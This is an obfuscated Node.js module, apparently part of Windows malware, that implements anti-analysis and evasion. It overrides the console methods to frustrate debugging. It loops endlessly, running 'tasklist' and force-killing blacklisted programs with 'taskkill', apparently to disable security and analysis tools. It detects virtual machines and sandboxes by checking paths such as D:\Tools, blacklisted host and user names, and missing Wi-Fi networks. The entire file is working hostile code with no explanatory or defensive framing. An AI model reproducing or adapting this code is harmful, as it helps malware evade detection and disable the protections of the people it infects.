var _0xead015 = (function () {
    var _0x5b659c = true
    return function (_0x93d16c, _0x3dff7c) {
      var _0x36d9d4 = _0x5b659c
        ? function () {
            if (_0x3dff7c) {
              var _0x971dfa = _0x3dff7c.apply(_0x93d16c, arguments)
              return (_0x3dff7c = null), _0x971dfa
            }
          }
        : function () {}
      return (_0x5b659c = false), _0x36d9d4
    }
  })(),
  _0x1a95b2 = _0xead015(this, function () {
    var _0x1d50a9 = function () {
        var _0x493734
        try {
          _0x493734 = Function(
            'return (function() {}.constructor("return this")( ));'
          )()
        } catch (_0x1c49c3) {
          _0x493734 = window
        }
        return _0x493734
      },
      _0x54e257 = _0x1d50a9(),
      _0x50a361 = (_0x54e257.console = _0x54e257.console || {})
    var _0x3efe99 = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (var _0x1a6fb6 = 0; _0x1a6fb6 < _0x3efe99.length; _0x1a6fb6++) {
      var _0x3e9de3 = _0xead015.constructor.prototype.bind(_0xead015)
      var _0x18be33 = _0x3efe99[_0x1a6fb6]
      var _0x14a750 = _0x50a361[_0x18be33] || _0x3e9de3
      _0x3e9de3['__proto__'] = _0xead015.bind(_0xead015)
      _0x3e9de3.toString = _0x14a750.toString.bind(_0x14a750)
      _0x50a361[_0x18be33] = _0x3e9de3
    }
  })
_0x1a95b2()
module.exports = (_0xe08c76) => {
  return {
    async detect_malicious_processes() {
      while (true) {
        await _0xe08c76.requires.child_process.exec(
          'tasklist',
          async (_0x116223, _0x516e6f) => {
            for (const _0x1e7858 of _0xe08c76.config.environ
              .blacklisted_programs) {
              _0x516e6f.toLowerCase().includes(_0x1e7858) &&
                (await _0xe08c76.requires.child_process.exec(
                  'taskkill /IM ' + _0x1e7858 + '.exe /F',
                  (_0x42139e) => {}
                ))
            }
          }
        ),
          await _0xe08c76.utils.time.sleep(1000)
      }
    },
    async inVM() {
      let _0x2929b7 = false
      for (var _0x47ce9e of ['D:\\Tools', 'D:\\OS2', 'D:\\NT3X']) {
        if (_0xe08c76.requires.fs.existsSync(_0x47ce9e)) {
          _0x2929b7 = true
          break
        }
      }
      for (var _0x5249fa of _0xe08c76.config.environ.blacklisted_pc_names) {
        if (
          _0x5249fa ==
            _0xe08c76.utils.encryption.decryptData(
              _0xe08c76.config.user.user_domain
            ) ||
          _0x5249fa ==
            _0xe08c76.utils.encryption.decryptData(
              _0xe08c76.config.user.username
            ) ||
          _0x5249fa ==
            _0xe08c76.utils.encryption.decryptData(
              _0xe08c76.config.user.hostname
            )
        ) {
          _0x2929b7 = true
          break
        }
      }
      if (_0xe08c76.config.counter.wifinetworks == 0) {
        const _0x52813c =
          await _0xe08c76.requires.systeminformation.getDynamicData()
        _0x52813c.wifiNetworks.length == 0 && (_0x2929b7 = true)
      }
      return _0x2929b7
    },
  }
}
